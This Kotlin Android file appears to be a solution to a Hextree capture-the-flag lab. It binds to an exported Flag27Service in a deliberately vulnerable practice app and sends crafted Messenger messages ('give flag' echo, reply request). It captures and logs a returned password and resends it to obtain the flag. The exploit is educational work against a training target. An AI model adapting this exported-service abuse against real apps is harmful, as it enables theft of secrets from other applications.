package io.hextree.initial

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.os.Bundle
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.Message
import android.os.Messenger
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Button
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.tooling.preview.Preview
import io.hextree.initial.ui.theme.InitialTheme

class MainActivity : ComponentActivity() {
    private var serviceMessenger: Messenger? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        val servico = Intent().apply {
            setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.services.Flag27Service")
        }

        class IncomingHandler : Handler(Looper.getMainLooper()) {
            override fun handleMessage(msg: Message) {
                val data = msg.data
                val password = data.getString("password")


                if (password != null) {
                    Log.i("HEXTREE", "Senha capturada: $password")



                    val msgFinal = Message.obtain(null, 3)
                    msgFinal.data = Bundle().apply {
                        putString("password", password)
                    }
                    msgFinal.replyTo = Messenger(this)
                    serviceMessenger?.send(msgFinal)
                }
            }
        }


            val clientMessenger = Messenger(IncomingHandler())

            val serviceConnection = object : ServiceConnection {
                override fun onServiceConnected(name: ComponentName?, service: IBinder?) {
                    Log.i("HEXTREE", "Serviço conectado")
                    serviceMessenger = Messenger(service)

                    // PASSO 1: Configurar o echo como "give flag" (what = 1)
                    val msg1 = Message.obtain(null, 1)
                    val data = Bundle()
                    data.putString("echo", "give flag")
                    msg1.data = data
                    serviceMessenger?.send(msg1)

                    val msg2 = Message.obtain(null, 2)
                    msg2.obj = Bundle()
                    msg2.replyTo = clientMessenger
                    serviceMessenger?.send(msg2)


                }

                override fun onServiceDisconnected(name: ComponentName?) {
                    serviceMessenger = null
                }
            }

    setContent {
            var value by remember { mutableIntStateOf(0) }
            InitialTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    Greeting(
                        name = "Hextree.io",
                        modifier = Modifier.padding(innerPadding)
                    )
                    Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                        Button(onClick = {
                            value += 1
                            Log.i("HEXTREE", "Tentando bindService...")
                            if (value >= 1) {
                                bindService(servico, serviceConnection,Context.BIND_AUTO_CREATE)
                            }
                        }) {
                            Text(text = "valor: $value")
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun Greeting(name: String, modifier: Modifier = Modifier) {
    Text(
        text = "Hello $name!",
        modifier = modifier
    )
}

@Preview(showBackground = true)
@Composable
fun GreetingPreview() {
    InitialTheme {
        Greeting("Hello.Hextree.io")
    }
}
